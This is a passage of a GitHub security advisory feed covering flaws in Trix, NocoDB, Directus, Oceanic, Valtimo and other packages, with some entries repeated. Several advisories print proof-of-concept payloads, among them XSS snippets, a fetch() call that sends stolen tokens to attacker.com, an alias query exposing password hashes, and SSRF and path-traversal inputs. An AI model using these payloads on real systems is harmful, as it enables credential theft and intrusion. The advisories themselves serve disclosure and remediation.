<li><a href="https://github.com/basecamp/trix/pull/1149">https://github.com/basecamp/trix/pull/1149</a></li>
<li><a href="https://github.com/basecamp/trix/commit/1a5c68a14d48421fc368e30026f4a7918028b7ad">https://github.com/basecamp/trix/commit/1a5c68a14d48421fc368e30026f4a7918028b7ad</a></li>
<li><a href="https://github.com/basecamp/trix/commit/841ff19b53f349915100bca8fcb488214ff93554">https://github.com/basecamp/trix/commit/841ff19b53f349915100bca8fcb488214ff93554</a></li>
<li><a href="https://github.com/basecamp/trix/releases/tag/v2.1.1">https://github.com/basecamp/trix/releases/tag/v2.1.1</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-34341">https://nvd.nist.gov/vuln/detail/CVE-2024-34341</a></li>
<li><a href="https://github.com/advisories/GHSA-qjqp-xr96-cj99">https://github.com/advisories/GHSA-qjqp-xr96-cj99</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-qjqp-xr96-cj99</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-05-07T16:49:24.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[trix] Trix Editor Arbitrary Code Execution Vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-qjqp-xr96-cj99</id>
        <link href="https://github.com/advisories/GHSA-qjqp-xr96-cj99"/>
        <updated>2024-05-15T14:20:38.000Z</updated>
        <content type="html"><![CDATA[<p>The Trix editor, versions prior to 2.1.1, is vulnerable to arbitrary code execution when copying and pasting content from the web or other documents with markup into the editor. The vulnerability stems from improper sanitization of pasted content, allowing an attacker to embed malicious scripts which are executed within the context of the application.</p>
<p><strong>Vulnerable Versions</strong>: </p>
<ul>
<li>1.x series up to and including 1.3.1</li>
<li>2.x series up to and including 2.1.0</li>
</ul>
<p><strong>Fixed Versions</strong>: </p>
<ul>
<li>v1.3.2</li>
<li>v2.1.1</li>
</ul>
<p><strong>Vector</strong>:</p>
<ul>
<li><strong>Bug 1</strong>: When copying content manipulated by a script, such as:</li>
</ul>
<pre><code class="language-js">document.addEventListener('copy', function(e){
  e.clipboardData.setData('text/html', '&lt;div&gt;&lt;noscript&gt;&lt;div class="123&lt;/noscript&gt;456&lt;img src=1 onerror=alert(1)//"&gt;&lt;/div&gt;&lt;/noscript&gt;&lt;/div&gt;');
  e.preventDefault();
});
</code></pre>
<p>and pasting into the Trix editor, the script within the content is executed.</p>
<ul>
<li><strong>Bug 2</strong>: Similar execution occurs with content structured as:</li>
</ul>
<pre><code class="language-js">document.write(`copy&lt;div data-trix-attachment="{&amp;quot;contentType&amp;quot;:&amp;quot;text/html&amp;quot;,&amp;quot;content&amp;quot;:&amp;quot;&amp;lt;img src=1 onerror=alert(101)&amp;gt;HELLO123&amp;quot;}"&gt;&lt;/div&gt;me`);
</code></pre>
<h3 id="impact">Impact:</h3>
<p>An attacker could exploit these vulnerabilities to execute arbitrary JavaScript code within the context of the user's session, potentially leading to unauthorized actions being performed or sensitive information being disclosed.</p>
<h3 id="remediation">Remediation:</h3>
<p><strong>Update Recommendation</strong>: Users should upgrade to Trix editor version 2.1.1 or later, which incorporates proper sanitization of input from copied content.</p>
<p><strong>CSP Enhancement</strong>: Additionally, enhancing the Content Security Policy (CSP) to disallow inline scripts can significantly mitigate the risk of such vulnerabilities. Set CSP policies such as script-src 'self' to ensure that only scripts hosted on the same origin are executed, and explicitly prohibit inline scripts using script-src-elem.</p>
<h3 id="references">References:</h3>
<ul>
<li><a href="https://github.com/basecamp/trix/releases/tag/v2.1.1">https://github.com/basecamp/trix/releases/tag/v2.1.1</a></li>
<li><a href="https://github.com/basecamp/trix/pull/1147">https://github.com/basecamp/trix/pull/1147</a></li>
<li><a href="https://github.com/basecamp/trix/pull/1149">https://github.com/basecamp/trix/pull/1149</a></li>
<li><a href="https://github.com/basecamp/trix/pull/1153">https://github.com/basecamp/trix/pull/1153</a></li>
</ul>
<p><strong>Credit</strong>: These issues were reported by security researchers <a href="https://hackerone.com/loknop">loknop</a> and <a href="https://hackerone.com/pinpie">pinpie</a>.</p>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/basecamp/trix/security/advisories/GHSA-qjqp-xr96-cj99">https://github.com/basecamp/trix/security/advisories/GHSA-qjqp-xr96-cj99</a></li>
<li><a href="https://github.com/basecamp/trix/pull/1147">https://github.com/basecamp/trix/pull/1147</a></li>
<li><a href="https://github.com/basecamp/trix/pull/1149">https://github.com/basecamp/trix/pull/1149</a></li>
<li><a href="https://github.com/basecamp/trix/commit/1a5c68a14d48421fc368e30026f4a7918028b7ad">https://github.com/basecamp/trix/commit/1a5c68a14d48421fc368e30026f4a7918028b7ad</a></li>
<li><a href="https://github.com/basecamp/trix/commit/841ff19b53f349915100bca8fcb488214ff93554">https://github.com/basecamp/trix/commit/841ff19b53f349915100bca8fcb488214ff93554</a></li>
<li><a href="https://github.com/basecamp/trix/releases/tag/v2.1.1">https://github.com/basecamp/trix/releases/tag/v2.1.1</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-34341">https://nvd.nist.gov/vuln/detail/CVE-2024-34341</a></li>
<li><a href="https://github.com/advisories/GHSA-qjqp-xr96-cj99">https://github.com/advisories/GHSA-qjqp-xr96-cj99</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-qjqp-xr96-cj99</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-05-07T16:49:24.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[remark-images-download] Zmarkdown Server-Side Request Forgery (SSRF) in remark-download-images]]></title>
        <id>https://github.com/advisories/GHSA-mf74-qq7w-6j7v</id>
        <link href="https://github.com/advisories/GHSA-mf74-qq7w-6j7v"/>
        <updated>2024-05-14T22:02:20.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>A major blind SSRF has been found in <code>remark-images-download</code>, which allowed
for requests to be made to neighboring servers on local IP ranges.
The issue came from a loose filtering of URLs inside the module.</p>
<p>Imagine a server running on a private network <code>192.168.1.0/24</code>.
A private service serving images is running on <code>192.168.1.2</code>, and
is not expected to be accessed by users. A machine is running
<code>remark-images-download</code> on the neighboring <code>192.168.1.3</code> host.
An user enters the following Markdown:</p>
<pre><code class="language-markdown">![](http://192.168.1.2/private-img.png)
</code></pre>
<p>The image is downloaded by the server and included inside the resulting
document. Hence, the user has access to the private image.</p>
<p>It has been corrected by preventing images downloads from
local IP ranges, both in IPv4 and IPv6.
To avoid malicious domain names, resolved local IPs from are also
forbidden inside the module.
This vulnerability impact is moderate, as it is can allow access to
unexposed documents on the local network, and is very easy
to exploit.</p>
<h3 id="patches">Patches</h3>
<p>The vulnerability has been patched in version 3.1.0.
If impacted, you should update to this version as soon as possible.</p>
<p>Please note that a minor version has been released instead of a bugfix.
This is due to a new option included to prevent another vulnerability,
upgrading to the new version will not break compatibility.</p>
<h3 id="workarounds">Workarounds</h3>
<p>No workaround is known, the package should be upgraded.</p>
<h3 id="for-more-information">For more information</h3>
<p>If you have any questions or comments about this advisory, open an issue in <a href="https://github.com/zestedesavoir/zmarkdown/issues">ZMarkdown</a>.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/zestedesavoir/zmarkdown/security/advisories/GHSA-mf74-qq7w-6j7v">https://github.com/zestedesavoir/zmarkdown/security/advisories/GHSA-mf74-qq7w-6j7v</a></li>
<li><a href="https://github.com/advisories/GHSA-mf74-qq7w-6j7v">https://github.com/advisories/GHSA-mf74-qq7w-6j7v</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-mf74-qq7w-6j7v</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-02-03T00:38:22.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[kongadmin] Konga is vulnerable to Cross Site Scripting (XSS) attacks]]></title>
        <id>https://github.com/advisories/GHSA-93pf-mrc8-4g3h</id>
        <link href="https://github.com/advisories/GHSA-93pf-mrc8-4g3h"/>
        <updated>2024-05-14T21:47:55.000Z</updated>
        <content type="html"><![CDATA[<p>Konga v0.14.9 is vulnerable to Cross Site Scripting (XSS) via the username parameter.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-34243">https://nvd.nist.gov/vuln/detail/CVE-2024-34243</a></li>
<li><a href="https://github.com/JByteL/CVE/tree/main/CVE-2024-34243">https://github.com/JByteL/CVE/tree/main/CVE-2024-34243</a></li>
<li><a href="https://github.com/advisories/GHSA-93pf-mrc8-4g3h">https://github.com/advisories/GHSA-93pf-mrc8-4g3h</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-93pf-mrc8-4g3h</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-05-14T18:31:01.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[oceanic.js] Oceanic allows unsanitized user input to lead to path traversal in URLs]]></title>
        <id>https://github.com/advisories/GHSA-5h5v-hw44-f6gg</id>
        <link href="https://github.com/advisories/GHSA-5h5v-hw44-f6gg"/>
        <updated>2024-05-14T20:14:00.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>Input to functions such as <code>Client.rest.channels.removeBan</code> is not url-encoded, resulting in specially crafted input such as <code>../../../channels/{id}</code> being normalized into the url <code>/api/v10/channels/{id}</code>, and deleting a channel rather than removing a ban.</p>
<h3 id="workarounds">Workarounds</h3>
<ul>
<li>Sanitizing user input, ensuring strings are valid for the purpose they are being used for.</li>
<li>Encoding input with <code>encodeURIComponent</code> before providing it to the library.</li>
</ul>
<h3 id="references">References</h3>
<p>OceanicJS/Oceanic@8bf8ee8373b8c565fbdbf70a609aba4fbc1a1ffe</p>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/OceanicJS/Oceanic/security/advisories/GHSA-5h5v-hw44-f6gg">https://github.com/OceanicJS/Oceanic/security/advisories/GHSA-5h5v-hw44-f6gg</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-34712">https://nvd.nist.gov/vuln/detail/CVE-2024-34712</a></li>
<li><a href="https://github.com/OceanicJS/Oceanic/commit/8bf8ee8373b8c565fbdbf70a609aba4fbc1a1ffe">https://github.com/OceanicJS/Oceanic/commit/8bf8ee8373b8c565fbdbf70a609aba4fbc1a1ffe</a></li>
<li><a href="https://github.com/advisories/GHSA-5h5v-hw44-f6gg">https://github.com/advisories/GHSA-5h5v-hw44-f6gg</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-5h5v-hw44-f6gg</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-05-14T20:13:58.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[directus] Directus Lacks Session Tokens Invalidation]]></title>
        <id>https://github.com/advisories/GHSA-g65h-35f3-x2w3</id>
        <link href="https://github.com/advisories/GHSA-g65h-35f3-x2w3"/>
        <updated>2024-05-14T20:04:31.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>Currently session tokens function like the other JWT tokens where they are not actually invalidated when logging out. The <code>directus_session</code> gets destroyed and the cookie gets deleted but if you captured the cookie value it will still work for the entire expiry time which is set to 1 day by default. Making it effectively a long lived unrevokable stateless token instead of the stateful session token it was meant to be.
When authenticating a session token JWT, Directus should also check whether the associated <code>directus_session</code> both still exists and has not expired (although the token should expire at the same time or before the session) to ensure leaked tokens are not valid indefinitely.</p>
<h2 id="steps-to-reproduce">Steps to reproduce</h2>
<ul>
<li>Copy the current session token from the cookie</li>
<li>Refresh and or log out</li>
<li>Use the saved session token to check if it is still valid</li>
</ul>
<h3 id="impact">Impact</h3>
<p>The lack of proper session expiration may improve the likely success of certain attacks. For example, a user might access a web site from a shared computer (such as at a library, Internet cafe, or open work environment). Incorrect token invalidation could allow an attacker to use the browser's history to access a Directus instance session previously accessed by the victim.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/directus/directus/security/advisories/GHSA-g65h-35f3-x2w3">https://github.com/directus/directus/security/advisories/GHSA-g65h-35f3-x2w3</a></li>
<li><a href="https://github.com/directus/directus/commit/a6172f8a6a0f31a6bf4305a090de172ebfb63bcf">https://github.com/directus/directus/commit/a6172f8a6a0f31a6bf4305a090de172ebfb63bcf</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-34709">https://nvd.nist.gov/vuln/detail/CVE-2024-34709</a></li>
<li><a href="https://github.com/advisories/GHSA-g65h-35f3-x2w3">https://github.com/advisories/GHSA-g65h-35f3-x2w3</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-g65h-35f3-x2w3</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-05-13T19:59:39.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[nocodb] NocoDB Vulnerable to Stored Cross-Site Scripting in Formula.vue]]></title>
        <id>https://github.com/advisories/GHSA-h6r4-xvw6-jc5h</id>
        <link href="https://github.com/advisories/GHSA-h6r4-xvw6-jc5h"/>
        <updated>2024-05-14T18:05:54.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>A stored cross-site scripting vulnerability exists within the Formula virtual cell comments functionality.</p>
<h3 id="details">Details</h3>
<p>The nc-gui/components/virtual-cell/Formula.vue displays a v-html tag with the value of "urls" whose contents are processed by the function replaceUrlsWithLink(). This function recognizes the pattern URI::(XXX) and creates a hyperlink tag <a> with href=XXX. However, it leaves all the other contents outside of the pattern URI::(XXX) unchanged, which makes the evil users can create a malicious table with a formula field whose payload is &lt;img src=1 onerror="malicious javascripts"URI::(XXX). The evil users then can share this table with others by enabling public viewing and the victims who open the shared link can be attacked.</a></p><a>
<h3 id="poc">PoC</h3>
<p>Step 1: Attacker login the nocodb and creates a table with two fields, "T" and "F". The type of field "T" is "SingleLineText", and the type of the "F" is "Fomula" with the formula content {T}
Step 2: The attacker sets the contents of T using &lt;img src=1 onerror=alert(localStorage.getItem('nocodb-gui-v2'))URI::(XXX)
Step 3: The attacker clicks the "Share" button and enables public viewing, then copies the shared link and sends it to the victims
Step 4: Any victims who open the shared link in their browsers will see the alert with their confidential tokens stored in localStorage</p>
</a><p><a>The attackers can use the fetch(</a><a href="http://attacker.com/?localStorage.getItem(%27nocodb-gui-v2%27)">http://attacker.com/?localStorage.getItem('nocodb-gui-v2')</a>) to replace the alert and then steal the victims' credentials in their attacker.com website.</p>
<h3 id="impact">Impact</h3>
<p>Stealing the credentials of NocoDB user that clicks the malicious link.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/nocodb/nocodb/security/advisories/GHSA-h6r4-xvw6-jc5h">https://github.com/nocodb/nocodb/security/advisories/GHSA-h6r4-xvw6-jc5h</a></li>
<li><a href="https://github.com/nocodb/nocodb/commit/7f58ce3726dfec71537d8b80474a0f95a48a1574">https://github.com/nocodb/nocodb/commit/7f58ce3726dfec71537d8b80474a0f95a48a1574</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2023-49781">https://nvd.nist.gov/vuln/detail/CVE-2023-49781</a></li>
<li><a href="https://github.com/advisories/GHSA-h6r4-xvw6-jc5h">https://github.com/advisories/GHSA-h6r4-xvw6-jc5h</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-h6r4-xvw6-jc5h</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-05-13T19:59:07.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[directus] Directus allows redacted data extraction on the API through "alias"]]></title>
        <id>https://github.com/advisories/GHSA-p8v3-m643-4xqx</id>
        <link href="https://github.com/advisories/GHSA-p8v3-m643-4xqx"/>
        <updated>2024-05-14T20:04:23.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>A user with permission to view any collection using redacted hashed fields can get access the raw stored version using the <code>alias</code> functionality on the API.
Normally, these redacted fields will return <code>**********</code> however  if we change the request to <code>?alias[workaround]=redacted</code> we can instead retrieve the plain text value for the field.</p>
<h2 id="steps-to-reproduce">Steps to reproduce</h2>
<ul>
<li>Set up a simple role with read-access to users.</li>
<li>Create a new user with the role from the previous step</li>
<li>Assign a password to the user</li>
</ul>
<p>The easiest way to confirm this vulnerability is by first visiting <code>/users/me</code>. You should be presented with a redacted JSON-object.
Next, visit <code>/users/me?alias[hash]=password</code>. This time, the returned JSON object will included the raw password hash instead of the redacted value.</p>
<h2 id="workaround">Workaround</h2>
<p>This can be avoided by removing permission to view the sensitive fields entirely from users or roles that should not be able to see them.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/directus/directus/security/advisories/GHSA-p8v3-m643-4xqx">https://github.com/directus/directus/security/advisories/GHSA-p8v3-m643-4xqx</a></li>
<li><a href="https://github.com/directus/directus/commit/e70a90c267bea695afce6545174c2b77517d617b">https://github.com/directus/directus/commit/e70a90c267bea695afce6545174c2b77517d617b</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-34708">https://nvd.nist.gov/vuln/detail/CVE-2024-34708</a></li>
<li><a href="https://github.com/advisories/GHSA-p8v3-m643-4xqx">https://github.com/advisories/GHSA-p8v3-m643-4xqx</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-p8v3-m643-4xqx</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-05-13T19:40:08.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[nocodb] NocoDB SQL Injection vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-8fxg-mr34-jqr8</id>
        <link href="https://github.com/advisories/GHSA-8fxg-mr34-jqr8"/>
        <updated>2024-05-14T18:06:13.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<hr>
<p>An authenticated attacker with create access could conduct a SQL Injection attack on MySQL DB using unescaped table_name.</p>
<h3 id="details">Details</h3>
<hr>
<h3 id="sql-injection-vulnerability-occurs-in-vitessclientts">SQL Injection vulnerability occurs in <strong>VitessClient.ts</strong>.</h3>
<pre><code class="language-javascript">async columnList(args: any = {}) {
    const func = this.columnList.name;
    const result = new Result();
    log.api(`${func}:args:`, args);

    try {
      args.databaseName = this.connectionConfig.connection.database;

      const response = await this.sqlClient.raw(
        `select *, table_name as tn from information_schema.columns where table_name = '${args.tn}' ORDER by ordinal_position`,
      );
</code></pre>
<p>The variable <strong>${args.tn}</strong> refers to the table name entered by the user.
A malicious attacker can escape the existing query by including a special character (') in the table name and insert and execute a new arbitrary SQL query.</p>
<h3 id="impact">Impact</h3>
<hr>
<p>This vulnerability may result in leakage of sensitive data in the database.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/nocodb/nocodb/security/advisories/GHSA-8fxg-mr34-jqr8">https://github.com/nocodb/nocodb/security/advisories/GHSA-8fxg-mr34-jqr8</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2023-50718">https://nvd.nist.gov/vuln/detail/CVE-2023-50718</a></li>
<li><a href="https://github.com/advisories/GHSA-8fxg-mr34-jqr8">https://github.com/advisories/GHSA-8fxg-mr34-jqr8</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-8fxg-mr34-jqr8</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-05-13T16:46:59.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[nocodb] NocoDB Allows Preview of Files with Dangerous Content]]></title>
        <id>https://github.com/advisories/GHSA-qg73-g3cf-vhhh</id>
        <link href="https://github.com/advisories/GHSA-qg73-g3cf-vhhh"/>
        <updated>2024-05-14T18:06:03.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<hr>
<p>Attacker can upload a html file with malicious content. If user tries to open that file in browser malicious scripts can be executed leading  Stored XSS(Cross-Site Script) attack.</p>
<h3 id="poc">PoC</h3>
<hr>
<p>NocoDB was configured using the Release Binary <code>Noco-macos-arm64</code>, and nocodb version 0.202.9 (currently the latest version) was used.
binary hash infos: md5(164b727f287af56168bc16fba622d0b4) / sha256(43e8e97f4c5f5330613abe071a359f84e4514b7186f92954b678087c37b7832e)
<img src="https://user-images.githubusercontent.com/86613161/287472673-aeb60a02-2080-429f-8583-9f130ab62779.png" alt="image" width="665"></p>
<h3 id="1-run-the-binary-to-start-the-server-and-access-the-arbitrary-table-dashboard">1. Run the binary to start the server and access the arbitrary table dashboard.</h3>
<img src="https://user-images.githubusercontent.com/86613161/287472852-98b2286e-ad66-45bf-b503-63780619d775.png" alt="image" width="830">

<p>Here, used the default <code>Features</code> table.</p>
<h3 id="2-click--in-the-table-field-header-to-add-an-attachment-field">2. Click <code>+</code> in the table <code>field header</code> to add an <code>attachment</code> field.</h3>
<img src="https://user-images.githubusercontent.com/86613161/287472936-98a67213-a547-4e71-915c-d2a43300530b.png" alt="image" width="1173">

<h3 id="3-click-the-add-files-button-to-select-and-upload-files">3. Click the <code>Add File(s)</code> button to select and upload files.</h3>
<img src="https://user-images.githubusercontent.com/86613161/287473041-0801ff39-e48c-4746-8518-be825bfd5533.png" alt="image" width="1132">

<p>Here, <code>test.html</code> containing <code>&lt;script&gt;alert(document.domain)&lt;/script&gt;</code> was uploaded.</p>
<h3 id="4-check-the-uploaded-file-path">4. Check the uploaded file path.</h3>
<p>&lt;img width="1163" alt="image" src="<a href="https://user-images.githubusercontent.com/86613161/287473337-b1c7c781-2fb5-4bd0-b464-dbd3d4158f04.png">https://user-images.githubusercontent.com/86613161/287473337-b1c7c781-2fb5-4bd0-b464-dbd3d4158f04.png</a>"</p>
<h3 id="5-access-the-uploaded-file-path">5. Access the uploaded file path.</h3>
<img src="https://user-images.githubusercontent.com/86613161/287473278-410f9228-58e3-4ee4-b111-70cdbffa9ed5.png" alt="image" width="1201">

<p>When the file path is accessed, the <code>&lt;script&gt;alert(document.domain)&lt;/script&gt;</code> script statement contained in the file is executed and the server host appears in the alert message.</p>
<h3 id="impact">Impact</h3>
<hr>
<p>This allows remote attacker to execute JavaScript code in the context of the user accessing the vector. An attacker could have used this vulnerability to execute requests in the name of a logged-in user or potentially collect information about the attacked user by displaying a malicious form.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/nocodb/nocodb/security/advisories/GHSA-qg73-g3cf-vhhh">https://github.com/nocodb/nocodb/security/advisories/GHSA-qg73-g3cf-vhhh</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2023-50717">https://nvd.nist.gov/vuln/detail/CVE-2023-50717</a></li>
<li><a href="https://github.com/advisories/GHSA-qg73-g3cf-vhhh">https://github.com/advisories/GHSA-qg73-g3cf-vhhh</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-qg73-g3cf-vhhh</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-05-13T16:46:49.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@valtimo/components] @valtimo/components exposes access token to form.io]]></title>
        <id>https://github.com/advisories/GHSA-xcp4-62vj-cq3r</id>
        <link href="https://github.com/advisories/GHSA-xcp4-62vj-cq3r"/>
        <updated>2024-05-14T20:04:06.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>When opening a form in Valtimo, the access token (JWT) of the user is exposed to <code>api.form.io</code> via the the <code>x-jwt-token</code> header. An attacker can retrieve personal information from this token, or use it to execute requests to the Valtimo REST API on behalf of the logged-in user.</p>
<p>This issue is caused by a misconfiguration of the Form.io component.</p>
<h3 id="attack-requirements">Attack requirements</h3>
<p>The following conditions have to be met in order to perform this attack:</p>
<ul>
<li>An attacker needs to have access to the network traffic on the <code>api.form.io</code> domain.</li>
<li>The content of the <code>x-jwt-token</code> header is logged or otherwise available to the attacker.</li>
<li>An attacker needs to have network access to the Valtimo API.</li>
<li>An attacker needs to act within the time-to-live of the access token. The default TTL in Keycloak is 5 minutes.</li>
</ul>
<h3 id="patches">Patches</h3>
<p>Versions 10.8.4, 11.1.6 and 11.2.2 have been patched</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/valtimo-platform/valtimo-frontend-libraries/security/advisories/GHSA-xcp4-62vj-cq3r">https://github.com/valtimo-platform/valtimo-frontend-libraries/security/advisories/GHSA-xcp4-62vj-cq3r</a></li>
<li><a href="https://github.com/valtimo-platform/valtimo-frontend-libraries/commit/1aaba5ef5750dafebbc7476fb08bf2375a25f19e">https://github.com/valtimo-platform/valtimo-frontend-libraries/commit/1aaba5ef5750dafebbc7476fb08bf2375a25f19e</a></li>
<li><a href="https://github.com/valtimo-platform/valtimo-frontend-libraries/commit/8c2dbf2a41180d2b0358d878290e4d37168f0fb6">https://github.com/valtimo-platform/valtimo-frontend-libraries/commit/8c2dbf2a41180d2b0358d878290e4d37168f0fb6</a></li>
<li><a href="https://github.com/valtimo-platform/valtimo-frontend-libraries/commit/d65e05fd2784bd4a628778b34a5b79ce2f0cef8c">https://github.com/valtimo-platform/valtimo-frontend-libraries/commit/d65e05fd2784bd4a628778b34a5b79ce2f0cef8c</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-34706">https://nvd.nist.gov/vuln/detail/CVE-2024-34706</a></li>
<li><a href="https://github.com/advisories/GHSA-xcp4-62vj-cq3r">https://github.com/advisories/GHSA-xcp4-62vj-cq3r</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-xcp4-62vj-cq3r</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2024-05-13T16:04:55.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@valtimo/components] @valtimo/components exposes access token to form.io]]></title>
        <id>https://github.com/advisories/GHSA-xcp4-62vj-cq3r</id>
        <link href="https://github.com/advisories/GHSA-xcp4-62vj-cq3r"/>
        <updated>2024-05-14T20:04:06.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>When opening a form in Valtimo, the access token (JWT) of the user is exposed to <code>api.form.io</code> via the the <code>x-jwt-token</code> header. An attacker can retrieve personal information from this token, or use it to execute requests to the Valtimo REST API on behalf of the logged-in user.</p>
<p>This issue is caused by a misconfiguration of the Form.io component.</p>
<h3 id="attack-requirements">Attack requirements</h3>
<p>The following conditions have to be met in order to perform this attack:</p>
<ul>
<li>An attacker needs to have access to the network traffic on the <code>api.form.io</code> domain.</li>
<li>The content of the <code>x-jwt-token</code> header is logged or otherwise available to the attacker.</li>
<li>An attacker needs to have network access to the Valtimo API.</li>
<li>An attacker needs to act within the time-to-live of the access token. The default TTL in Keycloak is 5 minutes.</li>
</ul>
<h3 id="patches">Patches</h3>
<p>Versions 10.8.4, 11.1.6 and 11.2.2 have been patched</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/valtimo-platform/valtimo-frontend-libraries/security/advisories/GHSA-xcp4-62vj-cq3r">https://github.com/valtimo-platform/valtimo-frontend-libraries/security/advisories/GHSA-xcp4-62vj-cq3r</a></li>
<li><a href="https://github.com/valtimo-platform/valtimo-frontend-libraries/commit/1aaba5ef5750dafebbc7476fb08bf2375a25f19e">https://github.com/valtimo-platform/valtimo-frontend-libraries/commit/1aaba5ef5750dafebbc7476fb08bf2375a25f19e</a></li>
<li><a href="https://github.com/valtimo-platform/valtimo-frontend-libraries/commit/8c2dbf2a41180d2b0358d878290e4d37168f0fb6">https://github.com/valtimo-platform/valtimo-frontend-libraries/commit/8c2dbf2a41180d2b0358d878290e4d37168f0fb6</a></li>
<li><a href="https://github.com/valtimo-platform/valtimo-frontend-libraries/commit/d65e05fd2784bd4a628778b34a5b79ce2f0cef8c">https://github.com/valtimo-platform/valtimo-frontend-libraries/commit/d65e05fd2784bd4a628778b34a5b79ce2f0cef8c</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-34706">https://nvd.nist.gov/vuln/detail/CVE-2024-34706</a></li>
<li><a href="https://github.com/advisories/GHSA-xcp4-62vj-cq3r">https://github.com/advisories/GHSA-xcp4-62vj-cq3r</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-xcp4-62vj-cq3r</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2024-05-13T16:04:55.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@valtimo/components] @valtimo/components exposes access token to form.io]]></title>
        <id>https://github.com/advisories/GHSA-xcp4-62vj-cq3r</id>
        <link href="https://github.com/advisories/GHSA-xcp4-62vj-cq3r"/>
        <updated>2024-05-14T20:04:06.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>When opening a form in Valtimo, the access token (JWT) of the user is exposed to <code>api.form.io</code> via the the <code>x-jwt-token</code> header. An attacker can retrieve personal information from this token, or use it to execute requests to the Valtimo REST API on behalf of the logged-in user.</p>
<p>This issue is caused by a misconfiguration of the Form.io component.</p>
